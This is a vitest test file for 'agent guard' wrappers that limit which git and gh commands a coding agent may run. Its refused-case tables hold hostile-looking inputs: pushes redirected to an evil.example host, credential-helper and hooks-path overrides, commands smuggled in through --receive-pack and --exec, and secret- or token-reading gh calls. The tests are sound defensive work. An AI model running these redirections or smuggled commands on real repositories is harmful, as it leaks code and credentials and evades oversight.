// Copied from leanish/leanish-development agents/bump-it/test/local-guard.test.ts at c6282df; see PROVENANCE.md.
// Local changes: the guards' directory, and their messages say "agent guard"; hooks-off and credential-helpers-off settings,
// `git remote add`, and pushes checked against real git.
import { spawnSync } from "node:child_process";
import { accessSync, constants, existsSync, mkdtempSync, readFileSync } from "node:fs";
import { chmod, mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { beforeAll, describe, expect, it } from "vitest";

const GUARD_DIR = join(dirname(fileURLToPath(import.meta.url)), "..", "guard");

/** Fake real `git` and `gh` behind the guard: they log their arguments. */
let fakeBin: string;
let callLog: string;

beforeAll(async () => {
  fakeBin = await mkdtemp(join(tmpdir(), "agent-guard-bin-"));
  callLog = join(fakeBin, "calls.log");
  await writeFile(
    join(fakeBin, "git"),
    `#!/bin/sh
echo "git $*" >> "${callLog}"
`,
  );
  await writeFile(
    join(fakeBin, "gh"),
    `#!/bin/sh
echo "gh $*" >> "${callLog}"
`,
  );
  await chmod(join(fakeBin, "git"), 0o755);
  await chmod(join(fakeBin, "gh"), 0o755);
});

interface Outcome {
  readonly allowed: boolean;
  readonly stderr: string;
}

async function run(
  tool: "git" | "gh",
  args: ReadonlyArray<string>,
  env: Record<string, string> = {},
): Promise<Outcome> {
  await writeFile(callLog, "");
  const result = spawnSync("/bin/bash", [join(GUARD_DIR, tool), ...args], {
    env: { PATH: `${GUARD_DIR}:${fakeBin}:/usr/bin:/bin`, ...env },
    encoding: "utf8",
  });
  const passedThrough = (await readFile(callLog, "utf8")).trim() === `${tool} ${args.join(" ")}`;
  if (result.status === 0 && !passedThrough) throw new Error(`exit 0 but the real ${tool} didn't run: ${result.stderr}`);
  if (result.status !== 0 && result.status !== 126) throw new Error(`unexpected exit ${result.status}: ${result.stderr}`);
  return { allowed: result.status === 0, stderr: result.stderr };
}

const BRANCH = "bump-it/dependency-refresh-2026-10-05";

describe("git guard", () => {
  it.each([
    [["status", "--short"]],
    [["log", "--oneline", "-10"]],
    [["-C", "/work/sqs-codec", "show", "origin/main:package-lock.json"]],
    [["diff", "origin/main"]],
    [["remote", "-v"]],
    [["config", "--get", "remote.origin.url"]],
    [["config", "remote.origin.url"]],
    [["config", "user.name", "bump-it"]],
    [["config", "rename-section", "scratch", "notes"]],
    [["remote", "-v", "--no-verbose", "get-url", "origin"]],
    [["config", "get", "user.name"]],
    [["config", "--file", ".gitmodules", "--get", "submodule.lib.url"]],
    [["config", "-f", "/work/settings.cfg", "user.name", "t"]],
    [["-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false", "status"]],
    [["-c", "Core.HooksPath=/dev/null", "status"]],
    [["-c", "credential.helper=", "-c", "protocol.file.allow=never", "fetch"]],
    [["-c", "Credential.Helper=", "fetch"]],
    [["remote", "add", "origin", "https://github.com/leanish/leanish-development.git"]],
    [["remote", "-v", "add", "origin", "git@github.com:leanish/leanish-development.git"]],
    [["remote", "--verbose", "show", "origin"]],
  ])("passes %j", async (args) => {
    expect((await run("git", args)).allowed).toBe(true);
  });

  it.each([
    [["push", "origin", BRANCH], "git push"],
    [["push", "-u", "origin", BRANCH], "git push"],
    [["-C", "/work/sqs-codec", "push", "origin", `HEAD:refs/heads/${BRANCH}`], "git push"],
    [["push", "--force", "origin", BRANCH], "git push"],
    [["push", "origin", "--delete", BRANCH], "git push"],
    [["send-pack", "git@example.invalid:repo.git", "refs/heads/main:refs/heads/published"], "git push"],
    [["http-push", "https://example.invalid/repo.git", "main"], "git push"],
    [["-c", "remote.origin.pushurl=https://evil.example/x", "push", "origin", BRANCH], "remote.origin.pushurl"],
    [["-c", "credential.helper=store", "fetch"], "credential.helper"],
    [["-c", "credential.helper", "fetch"], "credential.helper"],
    [["-c", "credential.helper= ", "fetch"], "credential.helper"],
    [["-c", "credential.https://example.com.helper=", "fetch"], "credential.https://example.com.helper"],
    [["-c", "credential.helper=", "-c", "credential.helper=store", "fetch"], "credential.helper"],
    [["-c", "CREDENTIAL.HELPER=store", "fetch"], "CREDENTIAL.HELPER"],
    [["-c", "Remote.Origin.PushURL=https://evil.example/x", "push", "origin", BRANCH], "Remote.Origin.PushURL"],
    [["-c", "core.hooksPath=/DEV/NULL", "status"], "core.hooksPath"],
    [["-c", "core.hooksPath=/tmp/x", "status"], "core.hooksPath"],
    [["-c", "core.hooksPath=/dev/null/x", "status"], "core.hooksPath"],
    [["-c", "core.hooksPath", "status"], "core.hooksPath"],
    [["-c", "core.hooksPath=/dev/null", "-c", "core.hooksPath=/tmp/x", "status"], "core.hooksPath"],
    [["--config-env=core.sshCommand=X", "fetch"], "--config-env"],
    [["--config-env", "credential.helper=X", "fetch"], "--config-env"],
    [["--attr-source", "HEAD", "push", "origin", BRANCH], "git push"],
    [["remote", "set-url", "origin", "https://evil.example/x"], "git remote set-url"],
    [["remote", "rename", "origin", "upstream"], "git remote rename"],
    [["remote", "remove", "origin"], "git remote remove"],
    [["remote", "set-url", "--push", "origin", "https://evil.example/x"], "git remote set-url"],
    [["remote", "-v", "set-url", "origin", "https://evil.example/x"], "git remote set-url"],
    [["remote", "--verbose", "rename", "origin", "upstream"], "git remote rename"],
    [["remote", "add", "other", "/work/other.git"], "only a network URL"],
    [["remote", "add", "other", "file:///work/other.git"], "only a network URL"],
    [["remote", "add", "other", "../other.git"], "only a network URL"],
    [["remote", "-v", "add", "other", "/work/other.git"], "only a network URL"],
    [["remote", "add", "-f", "other", "https://example.com/other.git"], "only <name> <URL>"],
    [["remote", "add", "--mirror=push", "other", "https://example.com/other.git"], "only <name> <URL>"],
    [["remote", "add", "-f", "https://example.com/other.git"], "git remote add -f"],
    [["config", "remote.origin.pushurl", "https://evil.example/x"], "remote.origin.pushurl"],
    [["-c", "alias.publish=push origin HEAD", "publish"], "alias.publish"],
    [["config", "alias.publish", "push"], "alias.publish"],
    [["config", "--file", ".git/config", "credential.helper", "store"], "credential.helper"],
    [["config", "-f", ".git/config", "remote.origin.url", "https://evil.example/x"], "remote.origin.url"],
    [["config", "credential.helper", "get"], "credential.helper"],
    [["config", "set", "credential.helper", "store"], "credential.helper"],
    [["config", "-t", "path", "alias.publish", "push"], "alias.publish"],
    [["config", "--fil", ".git/config", "remote.origin.url", "https://evil.example/x"], "remote.origin.url"],
    [["config", "rename-section", "scratch", "alias"], "git config alias"],
    [["config", "--rename-section", "scratch", "Credential"], "git config Credential"],
    [["remote", "add", "elsewhere", "git@./local:repo.git"], "only a network URL"],
    [["config", "--global", "user.name", "x"], "--global"],
    [["config", "--edit"], "--edit"],
  ])("refuses %j", async (args, reason) => {
    const outcome = await run("git", args);
    expect(outcome.allowed).toBe(false);
    expect(outcome.stderr).toContain("agent guard: refused");
    expect(outcome.stderr).toContain(reason);
  });
});

describe("gh guard", () => {
  it.each([
    [["pr", "list", "--state", "open"]],
    [["pr", "view", "136", "--json", "state,headRefOid"]],
    [["pr", "diff", "136", "--patch"]],
    [["pr", "checks", BRANCH]],
    [["repo", "view", "--json", "nameWithOwner"]],
    [["api", "--paginate", "repos/xerial/snappy-java/security-advisories"]],
    [["api", "-X", "GET", "repos/leanish/sqs-codec/dependabot/alerts", "-f", "state=open"]],
    [["run", "view", "123", "--log-failed"]],
    [["run", "list", "--commit", "abc", "--json", "name,status,conclusion"]],
    [["release", "view", "v1.0.0", "-R", "gradle/actions"]],
    [["label", "list"]],
    [["auth", "status"]],
  ])("passes %j", async (args) => {
    expect((await run("gh", args)).allowed).toBe(true);
  });

  it.each([
    [["pr", "create", "--draft", "--title", "t", "--body", "b"], "gh pr create"],
    [["pr", "comment", "140", "--body", "closing: malware"], "gh pr comment"],
    [["pr", "edit", "141", "--body", "b"], "gh pr edit"],
    [["pr", "ready", BRANCH], "gh pr ready"],
    [["pr", "close", "141", "--delete-branch"], "gh pr close"],
    [["pr", "merge", "141"], "gh pr merge"],
    [["pr", "reopen", "136"], "gh pr reopen"],
    [["repo", "edit", "--visibility", "public"], "gh repo edit"],
    [["api", "-X", "POST", "repos/leanish/sqs-codec/issues"], "POST"],
    [["api", "--method=DELETE", "repos/leanish/sqs-codec/git/refs/heads/main"], "DELETE"],
    [["api", "repos/leanish/sqs-codec/issues", "-f", "title=x"], "POST"],
    [["api", "graphql", "-f", "query=mutation{}"], "graphql"],
    [["run", "rerun", "123"], "gh run rerun"],
    [["workflow", "run", "ci.yml"], "gh workflow"],
    [["secret", "list"], "gh secret"],
    [["release", "create", "v9"], "gh release create"],
    [["label", "create", "leanish:bump-it"], "gh label create"],
    [["auth", "token"], "gh auth token"],
    [["issue", "create", "--title", "x"], "gh issue create"],
  ])("refuses %j", async (args, reason) => {
    const outcome = await run("gh", args);
    expect(outcome.allowed).toBe(false);
    expect(outcome.stderr).toContain(reason);
  });
});

/** The guard in front of the real git, on real repositories: a push passes only to a remote that is all local. */
describe("git guard pushes, with the real git", () => {
  // Made now, not in beforeAll: the refused cases' table names the bare repository's path.
  const root = mkdtempSync(join(tmpdir(), "agent-guard-push-"));
  const bare = join(root, "origin.git");
  const work = join(root, "work");
  // What a receive-pack command smuggled past the guard would create.
  const marker = join(root, "receive-pack-ran");
  // The real git, skipping any guard already on the PATH (a coding agent running these tests has one first).
  const realGit = (process.env["PATH"] ?? "/usr/bin:/bin")
    .split(":")
    .map((dir) => join(dir, "git"))
    .find((path) => {
      try {
        accessSync(path, constants.X_OK);
        return !readFileSync(path).subarray(0, 4096).toString("latin1").includes("agent guard");
      } catch {
        return false;
      }
    });
  if (realGit === undefined) throw new Error("no real git on PATH");
  const env = { PATH: `${GUARD_DIR}:${dirname(realGit)}:/usr/bin:/bin`, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", HOME: "/nonexistent" };

  function git(args: ReadonlyArray<string>, cwd = work): { readonly status: number | null; readonly stderr: string } {
    const result = spawnSync("/bin/bash", [join(GUARD_DIR, "git"), ...args], { cwd, env, encoding: "utf8" });
    return { status: result.status, stderr: result.stderr };
  }

  /** Runs the real git directly (setup), failing on any error. */
  function setup(args: ReadonlyArray<string>, cwd = work): void {
    const result = spawnSync(realGit!, args, { cwd, env, encoding: "utf8" });
    if (result.status !== 0) throw new Error(`git ${args.join(" ")}: ${result.stderr}`);
  }

  beforeAll(async () => {
    await mkdir(work);
    setup(["init", "-q", "--bare", bare], root);
    setup(["init", "-q", "-b", "main"]);
    setup(["-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init"]);
    setup(["remote", "add", "origin", bare]);
    setup(["remote", "add", "fileurl", `file://${bare}`]);
    setup(["remote", "add", "network", "https://example.invalid/repo.git"]);
    setup(["remote", "add", "pushurl", bare]);
    setup(["remote", "set-url", "--push", "pushurl", "https://example.invalid/repo.git"]);
    setup(["remote", "add", "mixed", bare]);
    setup(["remote", "set-url", "--add", "--push", "mixed", bare]);
    setup(["remote", "set-url", "--add", "--push", "mixed", "https://example.invalid/repo.git"]);
    setup(["remote", "add", "rewritten", `${bare}-rewritten`]);
    setup(["config", `url.https://example.invalid/.pushInsteadOf`, `${bare}-rewritten`]);
  });

  it.each([
    [["push", "-q", "origin", "main"]],
    [["push", "--no-verify", "--quiet", "origin", "HEAD:refs/heads/published"]],
    [["push", "--quiet", "--force-with-lease=refs/heads/published:HEAD", "origin", ":refs/heads/published"]],
    [["push", "-q", "fileurl", "main:refs/heads/via-file-url"]],
    [["push", "-q", "--", "origin", "main:refs/heads/after-dashes"]],
    [["push", "origin", "main:refs/heads/options-after", "--quiet", "--no-verify"]],
  ])("passes %j to a local remote", (args) => {
    const outcome = git(args);
    expect(outcome.stderr).not.toContain("agent guard");
    expect(outcome.status).toBe(0);
  });

  it("refuses a push to a network remote added through the guard", () => {
    expect(git(["remote", "add", "added", "https://example.invalid/added.git"]).status).toBe(0);
    const outcome = git(["push", "added", "main"]);
    expect(outcome.status).toBe(126);
    expect(outcome.stderr).toContain("agent guard: refused: git push");
  });

  it("refuses adding a remote at a path, so a push can't reach another repository on this machine", () => {
    const added = git(["remote", "add", "elsewhere", bare]);
    expect(added.status).toBe(126);
    expect(added.stderr).toContain("agent guard: refused: git remote add");
    expect(git(["push", "elsewhere", "main"]).status).toBe(126);
  });

  it("keeps the global options for the remote lookup and the push", () => {
    const outcome = git(["--git-dir", join(work, ".git"), "push", "-q", "origin", "main:refs/heads/from-git-dir"], root);
    expect(outcome.status).toBe(0);
    expect(spawnSync(realGit!, ["--git-dir", bare, "rev-parse", "--verify", "refs/heads/from-git-dir"]).status).toBe(0);
  });

  it.each([
    [["push", "network", "main"]],
    [["push", "pushurl", "main"]],
    [["push", "mixed", "main"]],
    [["push", "rewritten", "main"]],
    [["push"]],
    [["push", "-q"]],
    [["push", bare, "main"]],
    [["push", `file://${bare}`, "main"]],
    [["push", "no-such-remote", "main"]],
    [["push", "-o", "ci.skip", "origin", "main"]],
    [["push", "--recurse-submodules", "no", "network", "main"]],
    [["push", "--recurse-submodules=on-demand", "origin", "main"]],
    [["push", "--repo=origin", "main"]],
    // Options after the remote or a refspec count as much as those before it.
    [["push", "--dry-run", "origin", `--receive-pack=touch ${marker}`, "HEAD"]],
    [["push", "origin", "HEAD", "--exec", `touch ${marker}`]],
    [["push", "origin", "HEAD", "-o", "ci.skip"]],
  ])("refuses %j", (args) => {
    const outcome = git(args);
    expect(outcome.status).toBe(126);
    expect(outcome.stderr).toContain("agent guard: refused: git push");
    expect(existsSync(marker)).toBe(false);
  });

  it("limits a permitted push to the local transport, submodules pushed along included", async () => {
    // A submodule whose remote is a network one, with a commit only it has: the push to the local origin pushes it too.
    const sub = join(root, "sub");
    await mkdir(sub);
    setup(["init", "-q", "-b", "main"], sub);
    setup(["-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "sub"], sub);
    setup(["-c", "protocol.file.allow=always", "submodule", "add", "-q", sub, "sub"]);
    setup(["-C", "sub", "remote", "set-url", "origin", "https://example.invalid/sub.git"]);
    setup(["-C", "sub", "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "only here"]);
    setup(["add", "sub"]);
    setup(["-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "with sub"]);
    // An inherited, more permissive setting doesn't widen it.
    const result = spawnSync("/bin/bash", [join(GUARD_DIR, "git"), "-c", "push.recurseSubmodules=on-demand", "push", "-q", "origin", "HEAD:refs/heads/with-sub"], {
      cwd: work,
      env: { ...env, GIT_ALLOW_PROTOCOL: "file:https" },
      encoding: "utf8",
    });
    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("transport 'https' not allowed");
  });
});
